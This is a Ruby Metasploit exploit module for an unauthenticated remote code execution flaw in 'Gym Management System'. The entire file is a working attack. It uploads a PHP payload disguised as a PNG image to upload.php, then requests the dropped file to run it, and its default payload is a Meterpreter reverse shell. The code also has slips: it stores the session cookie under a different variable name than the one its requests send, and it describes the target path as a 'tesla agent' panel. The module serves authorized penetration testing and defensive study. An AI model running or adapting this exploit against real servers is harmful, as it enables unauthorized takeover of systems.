##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Gym Management System - Unauthenticated RCE',
      'Description' => %q{
        This module exploit a unauthenticated remote command execution vulnerability
        in the Gym Management System.
      },
      'Author' => [
        'Bobby Cooke', # discovery and python PoC
        'mekhalleh (RAMELLA Sébastien)' # this module
      ],
      'References' => [
        ['EDB', '48506'] # original proof of concept.
      ],
      'DisclosureDate' => '2020-05-22',
      'License' => MSF_LICENSE,
      'Platform' => ['PHP'],
      'Arch' => [ARCH_PHP],
      'Privileged' => false,
      'Targets' => [
        ['PHP (Meterpreter)',
          'Platform' => 'PHP',
          'Arch' => ARCH_PHP,
          'Type' => :php,
          'DefaultOptions' => {
            'PAYLOAD' => 'php/meterpreter/reverse_tcp'
          }
        ],
      ],
      'DefaultTarget' => 0,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/'])
    ])
  end

  def execute_command(cmd, _opts = {})
    post_data = Rex::MIME::Message.new
    post_data.add_part('upload', nil, nil, 'form-data; name="pupload";')
    post_data.add_part(
      "\x89\x50\x4e\x47\x0d\x0a\x1a\n#{cmd}",                                    # data is our payload
      'image/png',                                                               # content type
      nil,                                                                       # transfer encoding
      "form-data; name=\"file\"; filename=\"#{rand_text_alpha(8..16)}.php.png\"" # content disposition
    )

    # upload commands
    id_str = "#{rand_text_alpha(8..16)}"

    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'upload.php'),
      'cookie' => @cookies,
      'vars_get' => {
        'id' => id_str
      },
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    )

    if response && response.code == 200
      # trigger for the vuln
      response = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'upload', "#{id_str}.php"),
        'cookie' => @cookies
      )
    end

    register_files_for_cleanup("#{id_str}.php")
  end

  def get_session
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )
    if response && response.code == 200
      return response.get_cookies
    end
    return nil
  end

  def exploit
    print_status('Get a valid session cookie')
    @cookie = get_session
    if @cookie.nil?
      fail_with(Failure::UnexpectedReply, 'The resulting cookie was nil')
    end

    print_status("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
    vprint_status("Generated payload: #{payload.encoded}")

    execute_command(payload.encoded)
  end

end
